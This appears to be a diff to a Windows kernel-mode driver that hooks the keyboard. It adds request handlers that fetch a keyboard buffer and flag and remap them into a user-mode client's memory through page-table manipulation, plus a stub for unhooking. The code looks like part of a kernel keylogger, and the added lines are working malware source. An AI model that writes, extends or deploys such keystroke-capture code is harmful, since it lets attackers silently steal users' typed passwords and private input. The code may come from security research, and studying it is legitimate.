@@ -4,9 +4,11 @@
 #include <ControlDevice.h>
 #include <PageTableManipulation.h>
 #include <SharedHeader.h>
+#include <KeyboardHooker.h>
 
 WDFDEVICE ControlDevice;
 extern PKEYBOARD_INPUT_DATA keyboardBuffer;
+extern PUSHORT keyboardFlag;
 
 NTSTATUS CreateControlDevice(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath) {
 	KdPrint(("CreateControlDevice IRQ Level [%u]", KeGetCurrentIrql()));
@@ -136,10 +138,32 @@ VOID ReadKeyboardBuffer(_In_ WDFQUEUE Queue, _In_ WDFREQUEST Request) {
 					userSharedMemory->largePage = IsLargePage(keyboardBuffer);
 					status = STATUS_SUCCESS;
 				}
+				else if (instruction == 'P') {
+					KdPrint(("ReadKeyboardBuffer Client instruction is Get [P] offset\n"));
+					ULONG kmdfOffset = GetOffset(keyboardFlag);
+					KdPrint(("Sending keyboardBuffer address [0x%lx] offset [0x%lx] to user\n", (ULONG)keyboardFlag, kmdfOffset));
+					userSharedMemory->offset = kmdfOffset;
+					userSharedMemory->largePage = IsLargePage(keyboardFlag);
+					status = STATUS_SUCCESS;
+				}
 				else if (instruction == 'E') {
 					KdPrint(("ReadKeyboardBuffer Client instruction is [E]xtract keyboard buffer\n"));
 					PVOID clientMemory = userSharedMemory->ClientMemory;
 					status = Remap(keyboardBuffer, clientMemory);
+					WdfRequestComplete(Request, status);
+					return;
+				}
+				else if (instruction == 'F') {
+					KdPrint(("ReadKeyboardBuffer Client instruction is extract keyboard [F]lag\n"));
+					PVOID clientMemory = userSharedMemory->ClientMemory;
+					status = Remap(keyboardFlag, clientMemory);
+					WdfRequestComplete(Request, status);
+					return;
+				}
+				else if (instruction == 'U') {
+					KdPrint(("ReadKeyboardBuffer Client instruction is extract keyboard [U]nhook Keyboard\n"));
+					// TODO: this
+					status = STATUS_SUCCESS;
 					WdfRequestComplete(Request, status);
 					return;
 				}
